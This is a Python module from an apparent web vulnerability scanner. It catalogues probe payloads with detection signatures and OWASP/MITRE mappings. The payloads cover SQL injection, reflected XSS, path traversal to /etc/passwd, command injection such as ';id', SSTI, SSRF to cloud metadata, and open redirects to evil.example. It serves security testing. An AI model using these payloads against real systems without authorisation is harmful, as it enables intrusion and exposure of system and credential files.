"""Layer 1 — Web attack payload taxonomy + detection helpers.

This module mirrors the versioned-payload-taxonomy pattern used by L2
(`llm_probe.INJECTION_PAYLOADS`): every attack family is a list of payload
dicts carrying a stable id, a human name, the OWASP/MITRE mapping, the actual
payload string, and a detection technique. `web.py` drives these against
discovered parameters and confirms each hit with a content/timing signature so
that catch-all 200 pages don't produce false positives.

Safety: all probes are GET-only and non-destructive. Time-based payloads are
capped at MAX_TIME_BASED_DELAY seconds. Nothing here performs a request — the
layer owns the HTTP client, rate limiting, and concurrency caps.
"""
from __future__ import annotations

import re
from difflib import SequenceMatcher

# Hard ceiling for any time-based (SLEEP/WAITFOR/timeout) payload, in seconds.
# The layer also enforces this; kept here so payload authors can't exceed it.
MAX_TIME_BASED_DELAY = 5

# A unique, markup-bearing token. If it survives into a response unescaped, the
# input reaches the page/template/header without encoding.
def proof_token(seed: str) -> str:
    """Stable per-family proof token, e.g. 'ARGUSXSS7f3a'."""
    return f"ARGUS{seed.upper()}7f3a"


# ── SQL error signatures (error-based SQLi) ───────────────────────────────────
# Keyed by engine; each value is a compiled regex of distinctive error strings.
SQL_ERROR_SIGNATURES: dict[str, re.Pattern] = {
    "MySQL": re.compile(
        r"(?i)(SQL syntax.*MySQL|MySqlException|valid MySQL result|"
        r"check the manual that corresponds to your (MySQL|MariaDB)|"
        r"mysql_fetch_array\(\)|com\.mysql\.jdbc)"
    ),
    "PostgreSQL": re.compile(
        r"(?i)(PostgreSQL.*ERROR|pg_query\(\)|PSQLException|"
        r"unterminated quoted string at or near|invalid input syntax for)"
    ),
    "MSSQL": re.compile(
        r"(?i)(Microsoft SQL Server|ODBC SQL Server Driver|SQLServerException|"
        r"Unclosed quotation mark after the character string|"
        r"Incorrect syntax near)"
    ),
    "Oracle": re.compile(
        r"(?i)(ORA-\d{5}|Oracle error|quoted string not properly terminated|"
        r"oci_parse)"
    ),
    "SQLite": re.compile(
        r"(?i)(SQLite/JDBCDriver|SQLite\.Exception|sqlite3\.OperationalError|"
        r"unrecognized token:|near \".*\": syntax error)"
    ),
}


def match_sql_error(text: str) -> str | None:
    """Return the DB engine name whose error signature matches, else None."""
    if not text:
        return None
    sample = text[:8000]
    for engine, pat in SQL_ERROR_SIGNATURES.items():
        if pat.search(sample):
            return engine
    return None


# ── Filesystem / traversal signatures ─────────────────────────────────────────
# /etc/passwd line, or a Windows ini section header.
TRAVERSAL_SIGNATURE = re.compile(
    r"(root:.*:0:0:|daemon:.*:/usr/sbin|\[extensions\]|\[fonts\]|"
    r"; for 16-bit app support)"
)

# Command-injection output of `id`: uid=0(root) gid=0(root)...
CMDI_SIGNATURE = re.compile(r"uid=\d+\([^)]+\)\s+gid=\d+\(")

# Generic verbose error / stack-trace leakage (A04/A09).
STACKTRACE_SIGNATURE = re.compile(
    r"(?i)(Traceback \(most recent call last\)|"
    r"<b>(Fatal error|Warning|Notice)</b>|"
    r"at [\w.$]+\([\w.]+\.java:\d+\)|"
    r"System\.\w+Exception:|"
    r"org\.springframework|werkzeug\.exceptions|"
    r"DEBUG = True|django\.core\.exceptions)"
)


def reflects_token(text: str, token: str) -> bool:
    """True if the proof token survives unescaped in the response."""
    return bool(text) and token in text


def body_similarity(a: str, b: str) -> float:
    """Similarity ratio in [0,1] between two normalized response bodies.

    Used by boolean-based SQLi: a TRUE page should closely match the original
    page while a FALSE page diverges. Whitespace is collapsed so trivial
    rendering differences don't dominate.
    """
    norm = lambda s: re.sub(r"\s+", " ", (s or "")).strip()[:20000]
    return SequenceMatcher(None, norm(a), norm(b)).ratio()


def latency_confirms(baseline: float, delayed: float, expected: float,
                     tolerance: float = 1.5) -> bool:
    """Confirm a time-based payload caused a real server-side delay.

    The delayed request must take at least the baseline plus most of the
    expected delay (expected - tolerance), guarding against ordinary jitter.
    """
    expected = min(expected, MAX_TIME_BASED_DELAY)
    return (delayed - baseline) >= (expected - tolerance)


# ── Payload taxonomy ──────────────────────────────────────────────────────────
# Each payload: id, name, family, technique, payload, owasp, mitre, detect.
# `detect` selects the confirmation strategy the layer applies:
#   "sql_error" | "boolean" | "time" | "reflect" | "ssti_eval" |
#   "fs_signature" | "cmd_signature" | "redirect"
# `proof` (optional) is a token the payload embeds for "reflect"/"ssti_eval".

XSS_PROOF = proof_token("xss")

SQLI_PAYLOADS = [
    # error-based
    {"id": "SQLI-E1", "name": "Single-quote error probe", "family": "sqli",
     "technique": "error-based", "payload": "'", "detect": "sql_error",
     "owasp": "A05:2025", "mitre": "T1190"},
    {"id": "SQLI-E2", "name": "Double-quote error probe", "family": "sqli",
     "technique": "error-based", "payload": "\"", "detect": "sql_error",
     "owasp": "A05:2025", "mitre": "T1190"},
    {"id": "SQLI-E3", "name": "Parenthesis/quote error probe", "family": "sqli",
     "technique": "error-based", "payload": "')", "detect": "sql_error",
     "owasp": "A05:2025", "mitre": "T1190"},
    # boolean-based (paired true/false — layer sends both)
    {"id": "SQLI-B1", "name": "Boolean-based blind (numeric)", "family": "sqli",
     "technique": "boolean-based", "payload": {"true": " AND 1=1-- -", "false": " AND 1=2-- -"},
     "detect": "boolean", "owasp": "A05:2025", "mitre": "T1190"},
    {"id": "SQLI-B2", "name": "Boolean-based blind (string)", "family": "sqli",
     "technique": "boolean-based", "payload": {"true": "' AND '1'='1", "false": "' AND '1'='2"},
     "detect": "boolean", "owasp": "A05:2025", "mitre": "T1190"},
    # time-based
    {"id": "SQLI-T1", "name": "Time-based blind (MySQL SLEEP)", "family": "sqli",
     "technique": "time-based", "payload": "' AND SLEEP(5)-- -", "detect": "time",
     "delay": 5, "owasp": "A05:2025", "mitre": "T1190"},
    {"id": "SQLI-T2", "name": "Time-based blind (Postgres pg_sleep)", "family": "sqli",
     "technique": "time-based", "payload": "'; SELECT pg_sleep(5)-- -", "detect": "time",
     "delay": 5, "owasp": "A05:2025", "mitre": "T1190"},
    {"id": "SQLI-T3", "name": "Time-based blind (MSSQL WAITFOR)", "family": "sqli",
     "technique": "time-based", "payload": "'; WAITFOR DELAY '0:0:5'-- -", "detect": "time",
     "delay": 5, "owasp": "A05:2025", "mitre": "T1190"},
    # union-based
    {"id": "SQLI-U1", "name": "Union-based (1 column)", "family": "sqli",
     "technique": "union-based", "payload": "' UNION SELECT NULL-- -", "detect": "sql_error",
     "owasp": "A05:2025", "mitre": "T1190"},
    {"id": "SQLI-U2", "name": "Union-based (2 columns)", "family": "sqli",
     "technique": "union-based", "payload": "' UNION SELECT NULL,NULL-- -", "detect": "sql_error",
     "owasp": "A05:2025", "mitre": "T1190"},
]

XSS_PAYLOADS = [
    {"id": "XSS-H1", "name": "Reflected XSS (HTML body)", "family": "xss",
     "technique": "html-context", "payload": f"<x>{XSS_PROOF}</x>", "proof": f"<x>{XSS_PROOF}</x>",
     "detect": "reflect", "owasp": "A05:2025", "mitre": "T1059"},
    {"id": "XSS-A1", "name": "Reflected XSS (attribute breakout)", "family": "xss",
     "technique": "attribute-context", "payload": f'"><svg onload={XSS_PROOF}>',
     "proof": f'"><svg onload={XSS_PROOF}>', "detect": "reflect",
     "owasp": "A05:2025", "mitre": "T1059"},
    {"id": "XSS-J1", "name": "Reflected XSS (JS string breakout)", "family": "xss",
     "technique": "js-context", "payload": f"';{XSS_PROOF}//", "proof": f"';{XSS_PROOF}//",
     "detect": "reflect", "owasp": "A05:2025", "mitre": "T1059"},
]

TRAVERSAL_PAYLOADS = [
    {"id": "LFI-1", "name": "Path traversal (unix passwd)", "family": "traversal",
     "technique": "dot-dot-slash", "payload": "../../../../../../etc/passwd",
     "detect": "fs_signature", "owasp": "A01:2025", "mitre": "T1083"},
    {"id": "LFI-2", "name": "Path traversal (url-encoded)", "family": "traversal",
     "technique": "encoded", "payload": "..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
     "detect": "fs_signature", "owasp": "A01:2025", "mitre": "T1083"},
    {"id": "LFI-3", "name": "Path traversal (nested bypass)", "family": "traversal",
     "technique": "nested", "payload": "....//....//....//....//etc/passwd",
     "detect": "fs_signature", "owasp": "A01:2025", "mitre": "T1083"},
    {"id": "LFI-4", "name": "Path traversal (windows ini)", "family": "traversal",
     "technique": "windows", "payload": "..\\..\\..\\..\\..\\windows\\win.ini",
     "detect": "fs_signature", "owasp": "A01:2025", "mitre": "T1083"},
]

CMDI_PAYLOADS = [
    {"id": "CMDI-1", "name": "Command injection (semicolon id)", "family": "cmdi",
     "technique": "separator", "payload": ";id", "detect": "cmd_signature",
     "owasp": "A05:2025", "mitre": "T1059"},
    {"id": "CMDI-2", "name": "Command injection (pipe id)", "family": "cmdi",
     "technique": "separator", "payload": "|id", "detect": "cmd_signature",
     "owasp": "A05:2025", "mitre": "T1059"},
    {"id": "CMDI-3", "name": "Command injection (subshell)", "family": "cmdi",
     "technique": "subshell", "payload": "$(id)", "detect": "cmd_signature",
     "owasp": "A05:2025", "mitre": "T1059"},
    {"id": "CMDI-T1", "name": "Command injection (time-based sleep)", "family": "cmdi",
     "technique": "time-based", "payload": ";sleep 5", "detect": "time", "delay": 5,
     "owasp": "A05:2025", "mitre": "T1059"},
]

SSTI_PAYLOADS = [
    # 7*7=49 confirms evaluation; the literal "{{7*7}}" must NOT appear instead.
    {"id": "SSTI-1", "name": "SSTI (Jinja/Twig {{7*7}})", "family": "ssti",
     "technique": "expression", "payload": "{{7*7}}", "literal": "{{7*7}}",
     "expect": "49", "detect": "ssti_eval", "owasp": "A05:2025", "mitre": "T1221"},
    {"id": "SSTI-2", "name": "SSTI (${7*7})", "family": "ssti",
     "technique": "expression", "payload": "${7*7}", "literal": "${7*7}",
     "expect": "49", "detect": "ssti_eval", "owasp": "A05:2025", "mitre": "T1221"},
    {"id": "SSTI-3", "name": "SSTI (Razor/ERB <%=7*7%>)", "family": "ssti",
     "technique": "expression", "payload": "<%= 7*7 %>", "literal": "<%= 7*7 %>",
     "expect": "49", "detect": "ssti_eval", "owasp": "A05:2025", "mitre": "T1221"},
    {"id": "SSTI-4", "name": "SSTI (#{7*7})", "family": "ssti",
     "technique": "expression", "payload": "#{7*7}", "literal": "#{7*7}",
     "expect": "49", "detect": "ssti_eval", "owasp": "A05:2025", "mitre": "T1221"},
]

SSRF_PAYLOADS = [
    {"id": "SSRF-1", "name": "SSRF (loopback)", "family": "ssrf",
     "technique": "internal-host", "payload": "http://127.0.0.1:80/", "detect": "reflect",
     "proof": "127.0.0.1", "owasp": "A01:2025", "mitre": "T1090"},
    {"id": "SSRF-2", "name": "SSRF (cloud metadata)", "family": "ssrf",
     "technique": "metadata", "payload": "http://169.254.169.254/latest/meta-data/",
     "detect": "reflect", "proof": "meta-data", "owasp": "A01:2025", "mitre": "T1090"},
    {"id": "SSRF-3", "name": "SSRF (file scheme)", "family": "ssrf",
     "technique": "file-scheme", "payload": "file:///etc/passwd", "detect": "fs_signature",
     "owasp": "A01:2025", "mitre": "T1090"},
]

OPEN_REDIRECT_PAYLOADS = [
    {"id": "REDIR-1", "name": "Open redirect (protocol-relative)", "family": "open_redirect",
     "technique": "protocol-relative", "payload": "//evil.example/", "detect": "redirect",
     "marker": "evil.example", "owasp": "A01:2025", "mitre": "T1190"},
    {"id": "REDIR-2", "name": "Open redirect (backslash bypass)", "family": "open_redirect",
     "technique": "backslash", "payload": "/\\evil.example/", "detect": "redirect",
     "marker": "evil.example", "owasp": "A01:2025", "mitre": "T1190"},
    {"id": "REDIR-3", "name": "Open redirect (absolute URL)", "family": "open_redirect",
     "technique": "absolute", "payload": "https://evil.example/", "detect": "redirect",
     "marker": "evil.example", "owasp": "A01:2025", "mitre": "T1190"},
]

# Params most likely to feed redirect/SSRF sinks (used to prioritise probes).
REDIRECT_PARAM_HINTS = ("next", "url", "redirect", "return", "returnurl", "dest",
                        "destination", "continue", "goto", "target")
SSRF_PARAM_HINTS = ("url", "uri", "path", "dest", "callback", "webhook", "feed",
                    "image", "src", "proxy", "fetch", "load", "domain")

# Privileged paths to force-browse for broken access control (A01).
PRIVILEGED_PATHS = [
    "/admin", "/admin/", "/administrator", "/api/admin", "/dashboard",
    "/manage", "/management", "/api/users", "/api/v1/users", "/users",
    "/wp-admin/", "/phpmyadmin/", "/.env.bak", "/debug", "/actuator/",
]

# Common parameter names to fuzz when a target exposes none of its own.
COMMON_FUZZ_PARAMS = ("id", "q", "search", "query", "page", "file", "path",
                      "url", "next", "user", "name", "lang")
